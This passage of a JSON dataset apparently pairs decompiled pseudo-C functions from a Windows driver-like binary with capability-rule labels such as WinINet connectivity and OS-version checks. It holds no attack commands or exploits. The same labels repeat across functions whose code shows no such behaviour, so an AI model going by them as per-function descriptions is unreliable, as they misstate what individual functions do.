        "decompiled_code": "\nvoid fcn.0004653c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t arg1;\n    uint32_t auStackX8 [2];\n    int32_t aiStackX16 [2];\n    int64_t aiStackX24 [2];\n    \n    if (*0x80564 != '\\0') {\n        arg1 = 0;\n        do {\n            iVar1 = fcn.00032f64(arg1, aiStackX24);\n            if ((iVar1 == 0) && (aiStackX24[0] != 0)) {\n                iVar1 = fcn.000332f8(arg1, auStackX8);\n                if (iVar1 == 0) {\n                    fcn.00045a10(aiStackX24[0], auStackX8[0]);\n                    iVar1 = fcn.0003328c(arg1, aiStackX16);\n                    if ((iVar1 == 0) && (aiStackX16[0] != 0)) {\n                        fcn.00046144(arg1);\n                    }\n                }\n            }\n            uVar2 = arg1 + 1;\n            arg1 = uVar2;\n        } while (uVar2 < 100);\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "00046678": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00046678(uint64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t **ppiVar3;\n    uint32_t auStackX32 [2];\n    int32_t aiStack56 [2];\n    int64_t iStack48;\n    int64_t iStack40;\n    int64_t **ppiStack32;\n    \n    uVar2 = arg1 & 0xffffffff;\n    iStack48 = 0;\n    ppiStack32 = NULL;\n    if (*0x80564 == '\\0') {\n        uVar1 = 0xc0000001;\n    }\n    else {\n        uVar1 = fcn.000331cc(arg1, aiStack56);\n        auStackX32[0] = uVar1;\n        if (auStackX32[0] == 0) {\n            if (aiStack56[0] == 0) {\n                uVar1 = fcn.00032f64(uVar2, &iStack40);\n                auStackX32[0] = uVar1;\n                if (auStackX32[0] == 0) {\n                    if (iStack40 == 0) {\n                        uVar1 = fcn.00046144(uVar2);\n                        auStackX32[0] = uVar1;\n                        if (auStackX32[0] != 0) {\n                            return uVar1;\n                        }\n                        uVar2 = fcn.00032f64(uVar2, &iStack40);\n                        auStackX32[0] = uVar2;\n                        if (auStackX32[0] != 0) {\n                            return uVar2;\n                        }\n                        if (iStack40 == 0) {\n                            return 0xc000009d;\n                        }\n                    }\n                    if ((*0x80558 == 0) ||\n                       ((*0x80558 <= *(iStack40 + 0xa8) && (*(iStack40 + 0xa8) < *0x80560 + *0x80558)))) {\n                        (**0x11018)(auStackX32, &ppiStack32, *0x80570, arg2, arg3);\n                        if ((auStackX32[0] == 0) && ((**0x11098)(auStackX32, &iStack48, *0x80578),  auStackX32[0] == 0))\n                        {\n                            *(iStack48 + 0x60) = 0;\n                            fcn.0002fc18(iStack48 + 0x68);\n                            for (ppiVar3 = ppiStack32; *ppiVar3 != NULL; ppiVar3 = *ppiVar3) {\n                            }\n                            if (*(iStack48 + 8) == 0) {\n                                *(iStack48 + 0x10) = ppiVar3;\n                            }\n                            *ppiVar3 = *(iStack48 + 8);\n                            *(iStack48 + 8) = ppiStack32;\n                            *(iStack48 + 0x28) = 0;\n                            (**(iStack40 + 0xa8))(iStack40, &iStack48, 1);\n                            fcn.0002fce4(iStack48 + 0x68, 0xffffffff);\n                            auStackX32[0] = *(*(iStack48 + 0x2a) + 0x20 + iStack48);\n                        }\n                        if (ppiStack32 != NULL) {\n                            (*_fcn.00011128)();\n                        }\n                        if (iStack48 != 0) {\n                            fcn.0002fc94(iStack48 + 0x68);\n                            (**0x110a8)(iStack48);\n                        }\n                        uVar1 = auStackX32[0];\n                    }\n                    else {\n                        uVar1 = 0xc0000413;\n                    }\n                }\n            }\n            else {\n                uVar1 = 0x21590001;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 890
    },
    "00046e00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00046e00(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t aiStackX24 [2];\n    uchar auStack152 [128];\n    \n    iVar1 = fcn.000307e0();\n    if (iVar1 < 0x1b) {\n        fcn.000493e4(arg1, arg2);\n        do {\n            iVar1 = fcn.0004913c(arg1, arg2, auStack152, 0x80);\n            if (iVar1 != 0) break;\n        } while (aiStackX24[0] != 0);\n        fcn.00048008(arg1, arg2);\n        iVar1 = fcn.000307e0();\n        if (iVar1 < 0x1b) {\n            (*_fcn.000115b8)(arg2);\n        }\n    }\n    else {\n        do {\n            iVar1 = fcn.000400b4(arg2, auStack152, 0x80, aiStackX24);\n            if (iVar1 != 0) break;\n        } while (aiStackX24[0] != 0);\n        fcn.00040044(arg2);\n    }\n    return;\n}\n",
        "token_count": 271
    },
    "00046f10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00046f10(int64_t arg1, uint64_t arg2, ulong arg3, int64_t arg4)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    uint64_t *puVar6;\n    char *pcVar7;\n    int64_t **ppiVar8;\n    uint32_t uVar9;\n    ulong uVar10;\n    int64_t **in_stack_00000028;\n    int32_t in_stack_00000030;\n    char acStack88 [32];\n    \n    uVar3 = 0;\n    uVar9 = (arg2 & 0xffffffff) >> 5 & 0xfff;\n    if (arg2 == 0) {\n        return 0xc00000f0;\n    }\n    ppiVar8 = NULL;\n    fcn.0003205c(acStack88, 0x11);\n    if (in_stack_00000030 == 0) {\n        uVar3 = (**0x113f0)(0x8e3c0);\n    }\n    piVar5 = *(*0x80590 + uVar9 * 8);\n    if (piVar5 == NULL) {\ncode_r0x00047018:\n        piVar5 = fcn.00030cc4(0x218);\n        if (piVar5 == NULL) {\n            uVar10 = 0xc000009a;\n            goto code_r0x000470da;\n        }\n        fcn.0006677c(piVar5, 0, 0x218);\n        iVar4 = *0x80590;\n        puVar6 = piVar5 + 9;\n        *piVar5 = *(*0x80590 + uVar9 * 8);\n        *(iVar4 + uVar9 * 8) = piVar5;\n        piVar5[6] = arg2;\n        iVar4 = 0xb;\n        do {\n            *puVar6 = arg2;\n            puVar6 = puVar6 + 3;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    else {\n        do {\n            if (piVar5[6] == arg2) break;\n            piVar5 = *piVar5;\n        } while (piVar5 != NULL);\n        if (piVar5 == NULL) goto code_r0x00047018;\n        puVar6 = piVar5 + 9;\n        piVar5[7] = 0;\n        fcn.0006677c(puVar6, 0, 0x108);\n        fcn.0006677c(piVar5 + 0x2a, 0, 0x4b);\n        fcn.0006677c(piVar5 + 0x19b, 0, 0x4b);\n        piVar5[0x3d] = 0;\n        piVar5[0x3e] = 0;\n        piVar5[0x3f] = 0;\n        *(piVar5 + 0x40) = 0;\n        *(piVar5 + 0x201) = 0;\n        *(piVar5 + 0x204) = 0;\n        iVar4 = 0xb;\n        do {\n            *puVar6 = arg2;\n            puVar6 = puVar6 + 3;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    iVar4 = fcn.0006675e();\n    pcVar7 = acStack88;\n    piVar5[1] = iVar4;\n    do {\n        cVar2 = *pcVar7;\n        pcVar7[piVar5 + (0x10 - acStack88)] = cVar2;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar2 != '\\0');\n    piVar5[5] = arg1;\n    *(piVar5 + 8) = arg3;\n    piVar5[0x3f] = arg4;\n    *(piVar5 + 0x3d) = 0x54694343;\n    piVar5[0x3e] = arg2;\n    if (in_stack_00000028 != NULL) {\n        *in_stack_00000028 = piVar5 + 0x3d;\n    }\n    piVar1 = piVar5 + 0x41;\n    uVar10 = 0;\n    piVar5[0x42] = piVar1;\n    *piVar1 = piVar1;\n    ppiVar8 = in_stack_00000028;\ncode_r0x000470da:\n    if (in_stack_00000030 == 0) {\n        (**0x113e8)(0x8e3c0, ppiVar8 & 0xffffffffffffff00 | uVar3);\n    }\n    return uVar10;\n}\n",
        "token_count": 1100
    },
    "00048090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00048090(void)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t *piVar7;\n    ulong *puVar8;\n    uint64_t uVar9;\n    uint8_t *arg2;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    uint64_t arg1;\n    uint64_t uVar17;\n    uint8_t auStackX8 [8];\n    ulong uStackX16;\n    uchar auStack120 [16];\n    uchar auStack104 [40];\n    \n    uVar15 = 0;\n    if (*0x80590 != 0) {\n        (*_fcn.00011608)(auStack104, 0, 0);\n        uVar10 = uVar15;\ncode_r0x000480cd:\n        do {\n            uVar3 = (**0x113f0)(0x8e3c0);\n            for (puVar8 = *(uVar10 + *0x80590); uVar13 = uVar15,  uVar11 = uVar15,  puVar8 != NULL; puVar8 = *puVar8) {\n                if (((puVar8[6] != 0) && (*(puVar8 + 8) == 2)) && (*(puVar8 + 0x156) != 0)) {\n                    uVar11 = puVar8[6];\n                    uVar13 = puVar8[5];\n                    puVar8[6] = 0;\n                    break;\n                }\n            }\n            (**0x113e8)(0x8e3c0, puVar8 & 0xffffffffffffff00 | uVar3);\n            if (uVar11 != 0) {\n                iVar5 = (**0x114d8)(3, uVar13, 0, 0, 0, 0, 1, auStack104, auStack120);\n                if (iVar5 != 0) {\n                    iVar1 = *(iVar5 + 0xb8);\n                    *(iVar1 + -0x10) = 0;\n                    *(iVar1 + -8) = 0;\n                    *(iVar1 + -0x45) = 0;\n                    iVar1 = *(iVar5 + 0xb8);\n                    *(iVar1 + -0x48) = 0xf;\n                    *(iVar1 + -0x47) = 6;\n                    *(iVar1 + -0x20) = uVar13;\n                    *(iVar1 + -0x18) = uVar11;\n                    *(iVar1 + -0x40) = 4;\n                    *(iVar1 + -0x38) = 0;\n                    *(iVar1 + -0x30) = 0;\n                    *(iVar1 + -0x28) = 0;\n                    iVar4 = (**0x11120)(uVar13, iVar5);\n                    if (iVar4 == 0x103) {\n                        (*_fcn.00011630)(auStack104, 0, 0, 0, 0);\n                    }\n                }\n                goto code_r0x000480cd;\n            }\n            uVar10 = uVar10 + 8;\n        } while (uVar10 < 0x8000);\n        uStackX16 = 0xffffffffffb3b4c0;\n        (**0x115e8)(0, 0);\n        uVar11 = uVar15;\n        uVar13 = uVar15;\n        uVar17 = uVar15;\n        uVar10 = uVar15;\ncode_r0x00048214:\n        do {\n            auStackX8[0] = (**0x113f0)(0x8e3c0);\n            uVar12 = uVar15;\n            uVar14 = uVar15;\n            arg1 = uVar15;\n            for (puVar8 = *(uVar11 + *0x80590); uVar6 = uVar13,  uVar16 = uVar17,  puVar8 != NULL; puVar8 = *puVar8) {\n                uVar14 = uVar15;\n                if ((puVar8[6] != 0) && (*(puVar8 + 8) == 1)) {\n                    piVar7 = puVar8 + 10;\n                    uVar6 = uVar15;\n                    uVar16 = uVar15;\n                    do {\n                        if (*piVar7 != 0) {\n                            uVar12 = puVar8[5];\n                            arg1 = puVar8[6];\n                            uVar14 = puVar8[uVar6 * 3 + 10];\n                            uVar10 = puVar8[uVar6 * 3 + 0xb];\n                            puVar8[uVar6 * 3 + 10] = 0;\n                            uVar13 = uVar6;\n                            uVar17 = uVar16;\n                            if (uVar14 != 0) goto code_r0x000482a1;\n                            break;\n                        }\n                        uVar6 = uVar6 + 1;\n                        uVar16 = uVar16 + 1;\n                        piVar7 = piVar7 + 3;\n                        uVar14 = 0;\n                    } while (uVar6 < 0xb);\n                }\n            }\ncode_r0x000482a1:\n            uVar9 = puVar8 & 0xffffffffffffff00 | auStackX8[0];\n            (**0x113e8)(0x8e3c0, uVar9);\n            uVar13 = uVar6;\n            uVar17 = uVar16;\n            if (uVar14 != 0) {\n                iVar5 = (**0x114d8)(3, uVar12, 0, 0, 0, 0, 1, auStack104, auStack120);\n                if (iVar5 != 0) {\n                    iVar1 = *(iVar5 + 0xb8);\n                    *(iVar1 + -0x10) = 0;\n                    *(iVar1 + -8) = 0;\n                    *(iVar1 + -0x45) = 0;\n                    iVar1 = *(iVar5 + 0xb8);\n                    *(iVar1 + -0x48) = 0xf;\n                    *(iVar1 + -0x47) = 0xb;\n                    *(iVar1 + -0x20) = uVar12;\n                    *(iVar1 + -0x18) = arg1;\n                    *(iVar1 + -0x40) = uVar16;\n                    *(iVar1 + -0x38) = uVar14;\n                    *(iVar1 + -0x30) = uVar10;\n                    iVar4 = (**0x11120)(uVar12, iVar5);\n                    if (iVar4 == 0x103) {\n                        (*_fcn.00011630)(auStack104, 0, 0, 0, 0);\n                    }\n                    arg2 = auStackX8;\n                    iVar5 = fcn.000471b0(arg1, arg2);\n                    if (iVar5 != 0) {\n                        *(iVar5 + 0x50 + uVar6 * 0x18) = 0;\n                        (**0x113e8)(0x8e3c0, arg2 & 0xffffffffffffff00 | auStackX8[0]);\n                    }\n                }\n                goto code_r0x00048214;\n            }\n            uVar11 = uVar11 + 8;\n        } while (uVar11 < 0x8000);\n        uVar3 = (**0x113f0)(0x8e3c0);\n        iVar5 = *0x80590;\n        do {\n            puVar8 = *(iVar5 + uVar15 * 8);\n            while (puVar8 != NULL) {\n                puVar2 = *puVar8;\n                fcn.00030d24(puVar8);\n                puVar8 = puVar2;\n            }\n            uVar15 = uVar15 + 1;\n        } while (uVar15 < 0x1000);\n        fcn.00030d24(iVar5);\n        *0x80590 = 0;\n        (**0x113e8)(0x8e3c0, uVar9 & 0xffffffffffffff00 | uVar3);\n    }\n    return;\n}\n",
        "token_count": 1878
    },
    "00048ef0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00048ef0(void)\n\n{\n    if (*0x8c5c8 != 0) {\n        *0x8c5c8 = 0;\n        fcn.00048090();\n        if (*0x805a8 != 0) {\n            fcn.00017350(*0x805a8);\n            (*_fcn.000115b8)(*0x805a8);\n        }\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "00049620": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00049620(ulong noname_0, ulong noname_1, ulong noname_2, uint *arg4)\n\n{\n    int64_t *piVar1;\n    int16_t iVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint64_t uVar6;\n    int64_t arg1;\n    ulong uVar7;\n    uint32_t uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    int32_t *piVar11;\n    uint32_t uVar12;\n    int64_t iVar13;\n    int32_t *piVar14;\n    int16_t *piVar15;\n    int16_t *piVar16;\n    uchar *puVar17;\n    uint32_t uVar18;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    uint32_t auStack168 [2];\n    uint *puStack160;\n    uint32_t uStack152;\n    int64_t iStack144;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    \n    arg1 = 0;\n    *arg4 = 3;\n    fcn.0006677c(auStack168, 0, 0x20);\n    puStack160 = &uStack136;\n    auStack168[0] = 9;\n    fcn.0006677c(&uStack136, 0, 0x48);\n    uStack124 = 4;\n    uStack116 = 4;\n    uStack108 = 4;\n    uStack100 = 4;\n    iVar13 = 0x40;\n    uStack136 = 0x27;\n    uStack132 = 2;\n    uStack128 = 0x3b;\n    uStack120 = 0x3d;\n    uStack112 = 0x3c;\n    uStack104 = 0x3e;\n    uStack96 = 0x3f;\n    uStack92 = 1;\n    uStack88 = 0x40;\n    uStack84 = 1;\n    uStack80 = 0x41;\n    uStack76 = 2;\n    uStack72 = 0x42;\n    uStack68 = 2;\n    uVar3 = (**0x113f0)(0x8c658);\n    piVar11 = 0x8c678;\n    uVar6 = 0;\n    iVar9 = iVar13;\n    do {\n        if (*piVar11 != 0) {\n            uVar6 = uVar6 + 1;\n        }\n        piVar11 = piVar11 + 0xc;\n        iVar9 = iVar9 + -1;\n    } while (iVar9 != 0);\n    if (uVar6 == 0) {\n        uVar5 = 0;\ncode_r0x0004973d:\n        (**0x113e8)(0x8c658, piVar11 & 0xffffffffffffff00 | uVar3);\n    }\n    else {\n        arg1 = fcn.00030cc4(uVar6 * 0x30);\n        if (arg1 == 0) {\n            uVar5 = 0x21590004;\n            goto code_r0x0004973d;\n        }\n        uVar6 = 0;\n        piVar14 = 0x8c660;\n        iVar9 = arg1;\n        do {\n            if (piVar14[6] != 0) {\n                piVar11 = piVar14;\n                fcn.0006670a(iVar9, piVar14, 0x30);\n                uVar6 = uVar6 + 1;\n                iVar9 = iVar9 + 0x30;\n            }\n            piVar14 = piVar14 + 0xc;\n            iVar13 = iVar13 + -1;\n        } while (iVar13 != 0);\n        (**0x113e8)(0x8c658, piVar11 & 0xffffffffffffff00 | uVar3);\n        uVar12 = uVar6;\n        uStack152 = uVar12;\n        iStack144 = fcn.00030cec(uVar6);\n        if (iStack144 == 0) {\n            uVar5 = 0x21590004;\n            goto code_r0x00049b81;\n        }\n        uVar18 = 0;\n        if (uVar12 != 0) {\n            iVar9 = 0;\n            puVar17 = arg1 + 3;\n            do {\n                uVar7 = fcn.00030c98(auStack168[0] * 0x18 + 0x88);\n                *(iVar9 + iStack144) = uVar7;\n                if (*(iVar9 + iStack144) == 0) {\n                    uVar5 = 0x21590004;\n                    goto code_r0x00049b54;\n                }\n                fcn.0006677c(*(iVar9 + iStack144), 0, auStack168[0] * 0x18);\n                iVar13 = *(iVar9 + iStack144);\n                piVar16 = iVar13 + auStack168[0] * 0x18;\n                *(iVar13 + 8) = iVar13 + 0x10;\n                **(iVar9 + iStack144) = 4;\n                **(*(iVar9 + iStack144) + 8) = *(puVar17 + 0x15);\n                fcn.00066788(piVar16, 0x15c78, puVar17[-3], puVar17[-2], puVar17[-1], *puVar17);\n                *(*(iVar9 + iStack144) + 0x20) = piVar16;\n                iVar13 = -1;\n                piVar15 = piVar16;\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    iVar2 = *piVar15;\n                    piVar15 = piVar15 + 1;\n                } while (iVar2 != 0);\n                *(*(iVar9 + iStack144) + 0x18) = ~iVar13 * 2;\n                iVar13 = -1;\n                piVar15 = piVar16;\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    iVar2 = *piVar15;\n                    piVar15 = piVar15 + 1;\n                } while (iVar2 != 0);\n                uVar4 = puVar17[6];\n                piVar16 = piVar16 + ~iVar13;\n                uVar8 = puVar17[5];\n                fcn.00066788(piVar16, 0x14370, puVar17[1], puVar17[2], puVar17[3], puVar17[4], uVar8, uVar4);\n                *(*(iVar9 + iStack144) + 0x38) = piVar16;\n                iVar13 = -1;\n                iVar10 = iVar13;\n                piVar15 = piVar16;\n                do {\n                    if (iVar10 == 0) break;\n                    iVar10 = iVar10 + -1;\n                    iVar2 = *piVar15;\n                    piVar15 = piVar15 + 1;\n                } while (iVar2 != 0);\n                *(*(iVar9 + iStack144) + 0x30) = ~iVar10 * 2;\n                piVar15 = piVar16;\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    iVar2 = *piVar15;\n                    piVar15 = piVar15 + 1;\n                } while (iVar2 != 0);\n                piVar16 = piVar16 + ~iVar13;\n                fcn.00066788(piVar16, 0x15c78, puVar17[9], puVar17[10], puVar17[0xb], puVar17[0xc], uVar8, uVar4);\n                *(*(iVar9 + iStack144) + 0x50) = piVar16;\n                iVar13 = -1;\n                iVar10 = iVar13;\n                piVar15 = piVar16;\n                do {\n                    if (iVar10 == 0) break;\n                    iVar10 = iVar10 + -1;\n                    iVar2 = *piVar15;\n                    piVar15 = piVar15 + 1;\n                } while (iVar2 != 0);\n                *(*(iVar9 + iStack144) + 0x48) = ~iVar10 * 2;\n                piVar15 = piVar16;\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    iVar2 = *piVar15;\n                    piVar15 = piVar15 + 1;\n                } while (iVar2 != 0);\n                piVar16 = piVar16 + ~iVar13;\n                fcn.00066788(piVar16, 0x14370, puVar17[0xd], puVar17[0xe], puVar17[0xf], puVar17[0x10], puVar17[0x11], \n                             puVar17[0x12]);\n                *(*(iVar9 + iStack144) + 0x68) = piVar16;\n                iVar13 = -1;\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    iVar2 = *piVar16;\n                    piVar16 = piVar16 + 1;\n                } while (iVar2 != 0);\n                *(*(iVar9 + iStack144) + 0x60) = ~iVar13 * 2;\n                *(*(iVar9 + iStack144) + 0x80) = *(iVar9 + iStack144) + 0x88;\n                *(*(iVar9 + iStack144) + 0x78) = 1;\n                **(*(iVar9 + iStack144) + 0x80) = puVar17[0x1a] != '\\0';\n                *(*(iVar9 + iStack144) + 0x98) = *(iVar9 + iStack144) + 0xa0;\n                *(*(iVar9 + iStack144) + 0x90) = 1;\n                **(*(iVar9 + iStack144) + 0x98) = puVar17[0x19] != '\\0';\n                uVar18 = uVar18 + 1;\n                *(*(iVar9 + iStack144) + 0xb0) = *(iVar9 + iStack144) + 0xb8;\n                *(*(iVar9 + iStack144) + 0xa8) = 4;\n                **(*(iVar9 + iStack144) + 0xb0) = *(puVar17 + 0x25);\n                *(*(iVar9 + iStack144) + 200) = *(iVar9 + iStack144) + 0xd0;\n                *(*(iVar9 + iStack144) + 0xc0) = 4;\n                piVar1 = iVar9 + iStack144;\n                iVar9 = iVar9 + 8;\n                **(*piVar1 + 200) = *(puVar17 + 0x29);\n                puVar17 = puVar17 + 0x30;\n            } while (uVar18 < uVar12);\n        }\n        uVar5 = fcn.0002ba2c(auStack168, in_stack_00000028, in_stack_00000030);\n    }\ncode_r0x00049b54:\n    if ((iStack144 != 0) && (uVar12 = 0,  uStack152 != 0)) {\n        iVar9 = 0;\n        do {\n            fcn.00030d24(*(iStack144 + iVar9));\n            uVar12 = uVar12 + 1;\n            iVar9 = iVar9 + 8;\n        } while (uVar12 < uStack152);\n    }\ncode_r0x00049b81:\n    fcn.00030d24(iStack144);\n    if (arg1 != 0) {\n        fcn.00030d24(arg1);\n    }\n    return uVar5;\n}\n",
        "token_count": 2779
    },
    "0004a0d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0004a0d8(int16_t *arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int16_t *apiStackX8 [4];\n    \n    iVar2 = 0;\n    apiStackX8[0] = arg1;\n    do {\n        uVar1 = fcn.000312a0(apiStackX8[0], apiStackX8, 0x10);\n        if (0xff < uVar1) {\n            return 0;\n        }\n        if (iVar2 < 5) {\n            if ((*apiStackX8[0] != 0x2d) && (*apiStackX8[0] != 0x3a)) {\n                return 0;\n            }\n            apiStackX8[0] = apiStackX8[0] + 1;\n        }\n        else if (*apiStackX8[0] != 0) {\n            return 0;\n        }\n        *(iVar2 + arg2) = uVar1;\n        iVar2 = iVar2 + 1;\n        if (5 < iVar2) {\n            return 1;\n        }\n    } while( true );\n}\n",
        "token_count": 264
    },
    "0004a42c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0004a42c(ulong param_1, uint64_t param_2)\n\n{\n    int64_t iVar1;\n    int64_t arg1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    \n    if (*0x8d26c != 0) {\n        *0x8d26c = 0;\n        *0x8c5d4 = 1;\n        fcn.0002fcb8(0x8c650);\n        iVar3 = fcn.00032734(0x8d270);\n        if (iVar3 != 0) {\n            param_2 = 0;\n            fcn.00032748(0x8d270, 0);\n            fcn.00032710(0x8d270);\n        }\n        fcn.0002fc94(0x8c650);\n        uVar2 = (**0x113f0)(0x8d260);\n        arg1 = *0x8c5d8;\n        while (arg1 != 0) {\n            iVar1 = *(arg1 + 0x10);\n            fcn.00030d24(arg1);\n            arg1 = iVar1;\n        }\n        *0x8c5d8 = arg1;\n        (**0x113e8)(0x8d260, param_2 & 0xffffffffffffff00 | uVar2);\n    }\n    return;\n}\n",
        "token_count": 313
    },
    "0004b004": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0004b004(uint64_t arg1, uint64_t *arg2, int64_t arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t uVar3;\n    uint8_t uVar4;\n    int16_t iVar5;\n    ushort uVar6;\n    int32_t iVar7;\n    uint64_t *arg2_00;\n    unkbyte6 Var8;\n    uint64_t *arg2_01;\n    int32_t *piVar9;\n    uint32_t uVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint64_t arg1_00;\n    bool bVar13;\n    uchar auStack88 [8];\n    uint uStack80;\n    ushort uStack76;\n    \n    arg1_00 = arg1 & 0xffffffff;\n    Var8 = arg1 >> 0x10;\n    arg2_01 = arg2;\n    iVar5 = fcn.00030df4();\n    if ((*(arg2 + 0xc) == iVar5) && (0x1b < arg4)) {\n        fcn.0004af10(arg1_00, arg2, arg3);\n    }\n    else if ((*0x8d268 == 0) && (iVar5 = fcn.00030df4(CONCAT62(Var8, 0x800)),  *(arg2 + 0xc) == iVar5)) {\n        uVar4 = (**0x113f0)(0x8c658);\n        uVar11 = 0;\n        piVar9 = 0x8c688;\n        do {\n            uVar12 = arg4;\n            if (piVar9[-4] == arg1_00) {\n                if ((*(arg3 + 0xc) == piVar9[-10]) && (*(arg3 + 0x10) == piVar9[-7])) {\n                    uVar10 = *(arg2 + 6);\n                    arg2_01 = uVar10;\n                    puVar1 = uVar11 * 0x30 + 0x8c664;\n                    bVar13 = uVar10 < *puVar1;\n                    if (uVar10 == *puVar1) {\n                        uVar3 = *(arg2 + 10);\n                        arg2_01 = uVar10 & 0xffff0000 | uVar3;\n                        puVar2 = uVar11 * 0x30 + 0x8c668;\n                        bVar13 = uVar3 < *puVar2;\n                        if (uVar3 != *puVar2) goto code_r0x0004b0cf;\n                        iVar7 = 0;\n                    }\n                    else {\ncode_r0x0004b0cf:\n                        iVar7 = (1 - bVar13) - (bVar13 != 0);\n                    }\n                    if (iVar7 != 0) goto code_r0x0004b0fb;\n                    *piVar9 = *piVar9 + 1;\n                    auStack88._0_4_ = piVar9[-6];\n                    uVar6 = *(piVar9 + -5);\n                }\n                else {\ncode_r0x0004b0fb:\n                    if ((*(arg3 + 0xc) != piVar9[-7]) || (*(arg3 + 0x10) != piVar9[-10])) goto code_r0x0004b1e9;\n                    uVar10 = *(arg2 + 6);\n                    arg2_01 = uVar10;\n                    puVar1 = uVar11 * 0x30 + 0x8c670;\n                    bVar13 = uVar10 < *puVar1;\n                    if (uVar10 == *puVar1) {\n                        uVar3 = *(arg2 + 10);\n                        arg2_01 = uVar10 & 0xffff0000 | uVar3;\n                        puVar2 = uVar11 * 0x30 + 0x8c674;\n                        bVar13 = uVar3 < *puVar2;\n                        if (uVar3 != *puVar2) goto code_r0x0004b135;\n                        iVar7 = 0;\n                    }\n                    else {\ncode_r0x0004b135:\n                        iVar7 = (1 - bVar13) - (bVar13 != 0);\n                    }\n                    if (iVar7 != 0) goto code_r0x0004b1e9;\n                    piVar9[1] = piVar9[1] + 1;\n                    auStack88._0_4_ = piVar9[-9];\n                    uVar6 = *(piVar9 + -8);\n                }\n                uStack80 = 0;\n                auStack88._0_6_ = CONCAT24(uVar6, auStack88._0_4_);\n                auStack88 = auStack88._0_6_;\n                uStack76 = *(arg2 + 0xc);\n                arg2_01 = auStack88 + 6;\n                iVar7 = fcn.00032e88(arg1_00, 